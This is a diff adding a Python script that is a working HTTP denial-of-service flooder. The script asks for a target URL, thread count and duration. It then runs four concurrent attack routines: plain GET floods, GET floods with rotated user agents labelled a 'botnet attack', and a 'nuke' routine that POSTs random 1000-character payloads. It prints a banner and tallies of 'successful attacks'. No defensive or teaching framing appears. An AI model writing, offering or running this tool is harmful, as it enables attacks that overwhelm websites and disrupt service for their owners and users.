@@ -1,0 +1,155 @@
+import requests
+import threading
+import random
+import string
+import os
+import time
+import sys
+from colorama import Fore, Back, Style
+
+def read_user_agents():
+    with open("user.txt", "r") as f:
+        user_agents = f.read().splitlines()
+    return user_agents
+
+def http_flood(target_url, num_threads, duration):
+    def flood():
+        success_count = 0
+        error_count = 0
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            try:
+                requests.get(target_url)
+                success_count += 1
+            except:
+                error_count += 1
+
+        print(f"HTTP Flood - Successful attacks: {success_count}, Failed attacks: {error_count}")
+
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=flood)
+        t.start()
+        threads.append(t)
+
+    # Wait for the specified duration
+    time.sleep(duration)
+    
+    # Stop the threads
+    for t in threads:
+        t.join()
+
+    sys.exit()
+
+def botnet_attack(target_url, num_threads, duration):
+    def attack():
+        user_agents = read_user_agents()
+        success_count = 0
+        error_count = 0
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            headers = {'User-Agent': random.choice(user_agents)}
+            try:
+                requests.get(target_url, headers=headers)
+                success_count += 1
+            except:
+                error_count += 1
+
+        print(f"Botnet Attack - Successful attacks: {success_count}, Failed attacks: {error_count}")
+
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=attack)
+        t.start()
+        threads.append(t)
+
+    # Wait for the specified duration
+    time.sleep(duration)
+    
+    # Stop the threads
+    for t in threads:
+        t.join()
+
+    sys.exit()
+
+def http_get(target_url, num_threads, duration):
+    def get():
+        success_count = 0
+        error_count = 0
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            try:
+                requests.get(target_url)
+                success_count += 1
+            except:
+                error_count += 1
+
+        print(f"HTTP GET - Successful attacks: {success_count}, Failed attacks: {error_count}")
+
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=get)
+        t.start()
+        threads.append(t)
+
+    # Wait for the specified duration
+    time.sleep(duration)
+    
+    # Stop the threads
+    for t in threads:
+        t.join()
+
+    sys.exit()
+
+def nuke(target_url, num_threads, duration):
+    def launch():
+        chars = string.ascii_letters + string.digits
+        success_count = 0
+        error_count = 0
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            random_string = ''.join(random.choice(chars) for i in range(1000))
+            try:
+                requests.post(target_url, data=random_string)
+                success_count += 1
+            except:
+                error_count += 1
+
+        print(f"Nuke - Successful attacks: {success_count}, Failed attacks: {error_count}")
+
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=launch)
+        t.start()
+        threads.append(t)
+
+    # Wait for the specified duration
+    time.sleep(duration)
+    
+    # Stop the threads
+    for t in threads:
+        t.join()
+
+    sys.exit()
+
+if __name__ == "__main__":
+    target_url = input("URL: ")
+    num_threads = int(input("threads: "))
+    duration = int(input("time: "))
+    os.system(" clear") 
+    print(f"{Back.RED}{Fore.BLACK}       ░░                                                                         \n              ▓▓░░                                                                \n              ▒▒▓▓▓▓                                                              \n                ██▓▓▓▓                                                            \n                ░░██▓▓▓▓        ░░▓▓░░                                            \n                  ██▓▓▓▓▒▒      ████▓▓▒▒                                          \n              ░░▓▓▓▓██████    ▓▓████████▓▓▒▒                                      \n            ▒▒██████████████▓▓▓▓▓▓████████████░░                                  \n            ▒▒████████████████▓▓▓▓▓▓██████████▓▓                                  \n            ░░████████████████▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓                                  \n              ▓▓██████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░                                  \n  ▒▒▓▓▓▓██████████████▓▓████▓▓████████▒▒▒▒░░░░                                    \n  ████████████████████████▓▓████▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒                                  \n  ████████████████████████████▒▒▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓                                \n  ▓▓██████████████████████▓▓▓▓▒▒████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                              \n  ▒▒██████████████████████▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                            \n    ████████████████████▓▓██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                          \n    ▓▓████████████████▓▓██████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                        \n    ▒▒██████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                      \n      ████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                    \n      ▒▒▒▒░░░░░░    ████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                  \n                    ██████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░                \n                    ░░████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░              \n                      ████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░            \n                      ▓▓██▓▓████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██            \n                      ░░██▓▓▓▓████████████████████████▓▓▓▓██▓▓▓▓▓▓▒▒▒▒▒▒          \n                        ▓▓▓▓▓▓▓▓██████████████████████████▒▒▒▒░░░░░░░░▒▒▒▒        \n                        ░░▓▓▓▓▓▓▓▓████████████████████▓▓▒▒░░░░▒▒▓▓▓▓▓▓▓▓▓▓▒▒      \n                          ▓▓▓▓▓▓▓▓██████████████████▓▓▒▒▒▒▓▓██▓▓▓▓▓▓▓▓██▓▓▓▓      \n                            ▒▒▓▓▓▓▓▓████████████████▒▒▒▒▓▓██▓▓██▓▓▓▓▒▒▒▒░░▒▒░░    \n                              ▒▒▓▓████████████████▓▓▓▓████████▒▒▒▒░░░░░░░░░░▒▒    \n                                ▓▓██████████████▓▓▓▓██████▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░    \n                                  ▓▓██████████▓▓▓▓████████▓▓▒▒▒▒▒▒░░░░▒▒▒▒▓▓▓▓░░  \n                                  ░░██████████▓▓████████▓▓▒▒▒▒▒▒▒▒▓▓▓▓██▓▓▓▓▓▓▓▓  \n                                    ▒▒████████████████▓▓▓▓▓▓▒▒▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓░░\n                                      ▓▓████████████▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n                                      ░░████▓▓██████▓▓▓▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n                                        ▒▒▓▓▓▓██████▓▓▓▓▓▓██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n                                          ░░▒▒██████▓▓▓▓██████████▓▓▓▓▓▓▓▓▓▓▓▓██▓▓\n                                              ▓▓▓▓▓▓▓▓▓▓██████████▓▓▓▓▓▓██▓▓▒▒░░▒▒\n                                                ░░▒▒▓▓▓▓████████████████▓▓▒▒░░░░░░\n                                                    ▒▒▓▓██████████████▓▓▒▒▒▒▒▒▒▒░░\n                                                      ░░▓▓████████████▓▓▓▓▓▓▒▒▒▒░░\n                                                          ░░▓▓██████▓▓▓▓▓▓▓▓▒▒▒▒  \n                                                              ░░▓▓▓▓▒▒▒▒▒▒▓▓▓▓    {Fore.RESET}")
+
+    print(f"{Fore.BLACK}{Back.WHITE}ATTACK SEND TO -----{target_url}----- ") 
+    time.sleep(3) 
+   
+    http_flood_thread = threading.Thread(target=http_flood, args=(target_url, num_threads, duration))
+    http_flood_thread.start()
+
+    botnet_attack_thread = threading.Thread(target=botnet_attack, args=(target_url, num_threads, duration))
+    botnet_attack_thread.start()
+
+    http_get_thread = threading.Thread(target=http_get, args=(target_url, num_threads, duration))
+    http_get_thread.start()
+
+    nuke_thread = threading.Thread(target=nuke, args=(target_url, num_threads, duration))
+    nuke_thread.start()
